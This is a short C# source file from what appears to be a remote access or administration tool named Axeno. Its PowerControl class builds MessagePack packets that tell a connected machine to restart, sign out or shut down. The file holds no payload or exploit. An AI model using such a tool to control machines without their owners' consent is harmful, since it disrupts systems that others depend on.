using Axeno.MessagePack;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Axeno.Networking.Functions
{
    internal class PowerControl
    {
        public static byte[] Restart()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Power";
            msgpack.ForcePathObject("Option").AsString = "Restart";

            return msgpack.Encode2Bytes();
        }
        public static byte[] Signout()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Power";
            msgpack.ForcePathObject("Option").AsString = "Signout";

            return msgpack.Encode2Bytes();
        }
        public static byte[] Shutdown()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Power";
            msgpack.ForcePathObject("Option").AsString = "Shutdown";

            return msgpack.Encode2Bytes();
        }
    }
}
